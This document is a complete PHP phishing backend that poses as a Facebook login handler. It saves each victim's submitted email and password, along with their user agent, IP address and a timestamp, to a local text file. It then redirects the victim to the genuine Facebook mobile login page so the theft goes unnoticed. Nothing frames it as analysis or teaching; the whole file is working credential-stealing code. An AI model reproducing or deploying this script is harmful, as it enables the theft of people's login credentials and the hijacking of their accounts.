<?php
file_put_contents("malaykosananaymo.txt", "User-agent: " . $_SERVER['HTTP_USER_AGENT'] . "\nDate: " . date("d-m-y h:i:s") . "\nIP: " . $_SERVER['HTTP_X_FORWARDED_FOR'] . "\nEmail: " . $_POST['email'] . "\nPassword: " . $_POST['pass'] ."\n\n", FILE_APPEND);
header('Location: https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1&refid=9', true, 301);
exit();
?>